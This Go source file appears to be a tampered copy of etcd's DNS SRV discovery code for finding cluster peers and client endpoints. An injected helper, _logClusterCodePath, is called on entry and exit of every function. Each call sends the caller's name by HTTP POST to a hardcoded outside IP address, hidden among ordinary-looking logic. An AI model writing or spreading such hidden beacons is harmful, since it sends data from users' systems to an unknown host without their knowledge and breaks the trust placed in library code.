package srv

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net"
	"net/url"
	godefaulthttp "net/http"
	"strings"
	"go.etcd.io/etcd/pkg/types"
)

var (
	lookupSRV	= net.LookupSRV
	resolveTCPAddr	= net.ResolveTCPAddr
)

func GetCluster(serviceScheme, service, name, dns string, apurls types.URLs) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tempName := int(0)
	tcp2ap := make(map[string]url.URL)
	for _, url := range apurls {
		tcpAddr, err := resolveTCPAddr("tcp", url.Host)
		if err != nil {
			return nil, err
		}
		tcp2ap[tcpAddr.String()] = url
	}
	stringParts := []string{}
	updateNodeMap := func(service, scheme string) error {
		_, addrs, err := lookupSRV(service, "tcp", dns)
		if err != nil {
			return err
		}
		for _, srv := range addrs {
			port := fmt.Sprintf("%d", srv.Port)
			host := net.JoinHostPort(srv.Target, port)
			tcpAddr, terr := resolveTCPAddr("tcp", host)
			if terr != nil {
				err = terr
				continue
			}
			n := ""
			url, ok := tcp2ap[tcpAddr.String()]
			if ok {
				n = name
			}
			if n == "" {
				n = fmt.Sprintf("%d", tempName)
				tempName++
			}
			shortHost := strings.TrimSuffix(srv.Target, ".")
			urlHost := net.JoinHostPort(shortHost, port)
			if ok && url.Scheme != scheme {
				err = fmt.Errorf("bootstrap at %s from DNS for %s has scheme mismatch with expected peer %s", scheme+"://"+urlHost, service, url.String())
			} else {
				stringParts = append(stringParts, fmt.Sprintf("%s=%s://%s", n, scheme, urlHost))
			}
		}
		if len(stringParts) == 0 {
			return err
		}
		return nil
	}
	err := updateNodeMap(service, serviceScheme)
	if err != nil {
		return nil, fmt.Errorf("error querying DNS SRV records for _%s %s", service, err)
	}
	return stringParts, nil
}

type SRVClients struct {
	Endpoints	[]string
	SRVs		[]*net.SRV
}

func GetClient(service, domain string, serviceName string) (*SRVClients, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var urls []*url.URL
	var srvs []*net.SRV
	updateURLs := func(service, scheme string) error {
		_, addrs, err := lookupSRV(service, "tcp", domain)
		if err != nil {
			return err
		}
		for _, srv := range addrs {
			urls = append(urls, &url.URL{Scheme: scheme, Host: net.JoinHostPort(srv.Target, fmt.Sprintf("%d", srv.Port))})
		}
		srvs = append(srvs, addrs...)
		return nil
	}
	errHTTPS := updateURLs(GetSRVService(service, serviceName, "https"), "https")
	errHTTP := updateURLs(GetSRVService(service, serviceName, "http"), "http")
	if errHTTPS != nil && errHTTP != nil {
		return nil, fmt.Errorf("dns lookup errors: %s and %s", errHTTPS, errHTTP)
	}
	endpoints := make([]string, len(urls))
	for i := range urls {
		endpoints[i] = urls[i].String()
	}
	return &SRVClients{Endpoints: endpoints, SRVs: srvs}, nil
}
func GetSRVService(service, serviceName string, scheme string) (SRVService string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if scheme == "https" {
		service = fmt.Sprintf("%s-ssl", service)
	}
	if serviceName != "" {
		return fmt.Sprintf("%s-%s", service, serviceName)
	}
	return service
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
